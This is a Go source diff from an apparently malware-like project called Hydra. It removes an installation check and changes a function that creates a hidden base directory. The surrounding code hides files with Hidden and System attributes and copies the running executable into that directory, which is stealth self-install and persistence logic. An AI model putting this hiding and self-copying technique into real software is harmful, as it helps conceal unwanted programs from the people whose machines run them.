@@ -1,7 +1,6 @@
 package install
 
 import (
-	"log"
 	"os"
 	"path"
 	"syscall"
@@ -9,21 +8,6 @@ import (
 	"github.com/Raffy27/Hydra/util"
 	"golang.org/x/sys/windows"
 )
-
-//IsInstalled checks whether or not a valid Base is already present on the system.
-func IsInstalled() bool {
-	base := os.ExpandEnv(util.Base)
-	fi, err := os.Stat(base)
-	if os.IsNotExist(err) {
-		log.Println("Base does not exist")
-		return false
-	}
-	if !fi.IsDir() {
-		log.Println("Base is not a directory")
-		return false
-	}
-	return true
-}
 
 //HideFile works on a file or a directory and applies Hidden and Sysfile attributes.
 func HideFile(fn string) error {
@@ -36,12 +20,12 @@ func HideFile(fn string) error {
 }
 
 //CreateBase establishes an free directory as specified in Constants.
-func CreateBase() error {
+func CreateBase() (string, error) {
 	base := os.ExpandEnv(util.Base)
 	if err := os.Mkdir(base, os.ModeDir); err != nil {
-		return err
+		return base, err
 	}
-	return HideFile(base)
+	return base, HideFile(base)
 }
 
 //CopyExecutable copies the current binary to the Base.
